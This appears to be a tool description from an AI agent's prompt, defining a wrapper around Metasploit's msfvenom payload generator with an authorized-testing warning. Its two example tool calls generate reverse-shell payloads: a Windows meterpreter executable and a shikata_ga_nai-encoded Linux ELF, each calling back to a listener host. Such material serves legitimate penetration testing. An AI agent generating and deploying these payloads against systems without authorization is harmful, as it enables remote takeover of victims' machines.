### msfvenom_tool:
Metasploit payload generator. Create custom payloads for various platforms and architectures.

⚠️ CRITICAL: Only use for authorized penetration testing. Malicious use is illegal.

#### Arguments:
 *  "payload" (string) : Payload type (e.g., "windows/meterpreter/reverse_tcp", "linux/x86/shell_reverse_tcp")
 *  "lhost" (string) : Listening host IP
 *  "lport" (integer) : Listening port
 *  "format" (string) : Output format: "exe", "elf", "raw", "python", "powershell", "php"
 *  "output" (string) : Output file path
 *  "encoder" (Optional, string) : Encoder to use (e.g., "x86/shikata_ga_nai")

#### Usage examples:
##### 1: Windows reverse shell
\`\`\`json
{
    "thoughts": ["Creating Windows payload for authorized test"],
    "tool_name": "msfvenom_tool",
    "tool_args": {
        "payload": "windows/meterpreter/reverse_tcp",
        "lhost": "192.168.1.50",
        "lport": 4444,
        "format": "exe",
        "output": "/tmp/payload.exe"
    }
}
\`\`\`

##### 2: Linux ELF payload with encoding
\`\`\`json
{
    "thoughts": ["Generating encoded Linux payload"],
    "tool_name": "msfvenom_tool",
    "tool_args": {
        "payload": "linux/x86/meterpreter/reverse_tcp",
        "lhost": "10.0.0.100",
        "lport": 4443,
        "format": "elf",
        "encoder": "x86/shikata_ga_nai",
        "output": "/tmp/payload.elf"
    }
}
\`\`\`
